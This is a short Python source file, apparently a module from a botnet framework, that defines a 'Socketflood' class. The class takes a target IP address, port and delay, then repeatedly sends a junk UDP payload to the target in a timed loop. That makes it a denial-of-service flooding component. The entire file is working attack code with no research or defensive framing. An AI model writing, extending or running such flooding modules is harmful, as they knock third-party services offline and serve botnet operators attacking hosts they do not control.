from threading import Thread
import time
import socket as socketlib

from botnet import logger
from botnet.modules.base_module import TimedModule

# Socketflood class
class Socketflood(TimedModule):
    # Setup params and socket object
    def __init__(self, params):
        self.target_ip = params[0]
        self.target_port = int(params[1])
        self.delay = int(params[2])

        super().__init__(params, self.delay)

        self.socket = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_DGRAM)

    # Flood
    def in_loop(self):
        self.socket.sendto("FFFFFFFFFFFFFFFFFFFFFFFFFFFFF".encode(), (self.target_ip, self.target_port))
